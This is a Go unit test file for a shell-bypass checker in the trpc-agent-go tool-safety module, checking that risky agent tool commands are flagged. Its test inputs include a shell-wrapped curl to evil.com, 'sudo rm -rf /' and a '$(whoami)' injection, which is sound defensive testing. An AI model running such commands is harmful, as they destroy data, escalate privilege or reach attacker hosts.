// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.

package checkers

import (
	"context"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/internal/toolsafety"
)

func TestShellBypassChecker_ShWrapper(t *testing.T) {
	c := NewShellBypassChecker()

	findings, err := c.Check(context.Background(), &toolsafety.ScanRequest{
		ToolName: "test",
		Command:  "sh -c 'curl http://evil.com'",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	hasWrapper := false
	for _, f := range findings {
		if f.RuleID == toolsafety.RuleShellWrapper {
			hasWrapper = true
			break
		}
	}
	if !hasWrapper {
		t.Errorf("expected SHELL_WRAPPER finding, got %+v", findings)
	}
}

func TestShellBypassChecker_Sudo(t *testing.T) {
	c := NewShellBypassChecker()

	findings, err := c.Check(context.Background(), &toolsafety.ScanRequest{
		ToolName: "test",
		Command:  "sudo rm -rf /",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	hasPrivilege := false
	for _, f := range findings {
		if f.RuleID == toolsafety.RulePrivilegeEscalation {
			hasPrivilege = true
			break
		}
	}
	if !hasPrivilege {
		t.Errorf("expected PRIVILEGE_ESCALATION finding for sudo, got %+v", findings)
	}
}

func TestShellBypassChecker_SafeCommand(t *testing.T) {
	c := NewShellBypassChecker()

	findings, err := c.Check(context.Background(), &toolsafety.ScanRequest{
		ToolName: "test",
		Command:  "ls -la",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected no findings for safe command, got %+v", findings)
	}
}

func TestShellBypassChecker_ShellInjection(t *testing.T) {
	c := NewShellBypassChecker()

	findings, err := c.Check(context.Background(), &toolsafety.ScanRequest{
		ToolName: "test",
		Command:  "echo $(whoami)",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	hasInjection := false
	for _, f := range findings {
		if f.RuleID == toolsafety.RuleCommandInjection {
			hasInjection = true
			break
		}
	}
	if !hasInjection {
		t.Errorf("expected COMMAND_INJECTION finding for $(...), got %+v", findings)
	}
}
